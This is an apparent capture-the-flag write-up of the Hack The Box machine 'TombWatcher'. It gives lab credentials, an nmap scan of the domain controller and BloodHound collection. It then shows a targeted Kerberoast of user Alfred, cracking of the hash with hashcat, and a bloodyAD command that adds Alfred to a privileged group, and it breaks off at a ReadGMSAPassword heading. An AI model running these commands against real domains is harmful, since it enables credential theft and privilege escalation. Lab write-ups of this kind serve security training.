# TombWatcher

## Machine Information

Starting user: `henry / H3nry_987TGV!`

Domain: `tombwatcher.htb0`&#x20;

Domain SID: `S-1-5-21-1392491010-1358638721-2126982587`

DC: `DC01.tombwatcher.htb`&#x20;





## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.72

Nmap scan report for 10.10.11.72
Host is up (0.033s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 15:13:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
58171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## Bloodhound Enumeration

First things first, run the `bloodhound-python` ingester to get all Domain data as `Henry` user.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.11.72 -dc tombwatcher.htb -d tombwatcher.htb --zip -u 'henry' -p 'H3nry_987TGV!'
```
{% endcode %}



## Kerberost attack to user Alfred

As we can see bellow, there is a kerberoastable user.&#x20;

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
 ./targetedKerberoast.py --dc-ip '10.10.11.72' -v -d 'TOMBWATCHER.HTB' -u 'henry' -p 'H3nry_987TGV!'
```
{% endcode %}



Copy the retrived hash into a file

{% code title="kerb.txt" overflow="wrap" %}
```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.HTB/Alfred*$c045c3aad...8bf8ec65b089
```
{% endcode %}

Try to crack it

```bash
hashcat -m 13100 -o creds.txt -a 0 kerb.txt /usr/share/wordlists/rockyou.txt
```

We've cracked it. The password for the user `Alfred` is `basketball` .

## AddSelf privilege on user Alfred

From bloodhound we can see which the user Alfred has privilege to add itself to INFRASTRUCTURE AD group.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

{% code title="BloodyAD" overflow="wrap" %}
```bash
bloodyAD --host '10.10.11.72' -d 'TOMBWATCHER.HTB' -u 'Alfred' -p 'basketball' add groupMember INFRASTRUCTURE Alfred
```
{% endcode %}



## ReadGMSAPassword rights&#x20;

Always from bloodhound we notice that the group INFRASTRUCTURE has ReadGMSAPassword rights.

